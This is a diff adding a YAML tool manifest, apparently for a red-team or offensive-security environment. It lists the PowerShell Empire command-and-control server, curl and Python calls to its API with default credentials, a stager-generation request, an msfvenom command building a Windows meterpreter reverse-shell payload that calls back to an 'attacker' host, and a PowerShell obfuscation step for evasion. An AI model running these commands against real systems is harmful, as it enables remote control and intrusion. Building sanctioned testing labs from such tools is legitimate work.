@@ -1,0 +1,51 @@
+powershell-empire:
+  description: "PowerShell Empire C2 framework — server with REST API"
+  category: "c2"
+  install_cmd: "pip3 install powershell-empire"
+  verify_cmd: "powershell-empire server --version 2>&1 | head -n 1"
+  examples:
+    - "powershell-empire server"
+    - "powershell-empire client"
+
+curl:
+  description: "Interact with Empire REST API for listener, stager, and agent management"
+  category: "c2"
+  install_cmd: "apt-get install -y curl"
+  verify_cmd: "curl --version"
+  examples:
+    - "curl -s -X POST http://empire:1337/api/v2/users/login -d '{\"username\":\"empireadmin\",\"password\":\"password123\"}'"
+    - "curl -s -H 'Authorization: Bearer TOKEN' http://empire:1337/api/v2/listeners"
+    - "curl -s -H 'Authorization: Bearer TOKEN' http://empire:1337/api/v2/agents"
+    - "curl -s -X POST -H 'Authorization: Bearer TOKEN' http://empire:1337/api/v2/stagers -d '{\"template\":\"windows/launcher_bat\",\"options\":{\"Listener\":\"http\"}}'"
+
+starkiller:
+  description: "Empire GUI frontend for managing listeners, agents, and modules"
+  category: "c2"
+  install_cmd: "apt-get install -y starkiller"
+  verify_cmd: "which starkiller"
+  examples:
+    - "starkiller"
+
+msfvenom:
+  description: "Metasploit payload generator for use as initial access alongside Empire"
+  category: "exploitation"
+  install_cmd: "apt-get install -y metasploit-framework"
+  verify_cmd: "msfvenom --version"
+  examples:
+    - "msfvenom -p windows/meterpreter/reverse_https LHOST=attacker LPORT=443 -f exe -o payload.exe"
+
+python3:
+  description: "Python scripts for Empire API automation and stager customization"
+  category: "c2"
+  install_cmd: "apt-get install -y python3 python3-pip && pip3 install requests"
+  verify_cmd: "python3 --version"
+  examples:
+    - "python3 -c \"import requests; print(requests.post('http://empire:1337/api/v2/users/login', json={'username':'empireadmin','password':'password123'}).json())\""
+
+obfuscator:
+  description: "PowerShell obfuscation tools for evasion"
+  category: "evasion"
+  install_cmd: "pip3 install invoke-obfuscation"
+  verify_cmd: "python3 -c 'print(\"Obfuscator ready\")'"
+  examples:
+    - "python3 obfuscate_stager.py --input stager.ps1 --output obfuscated.ps1"
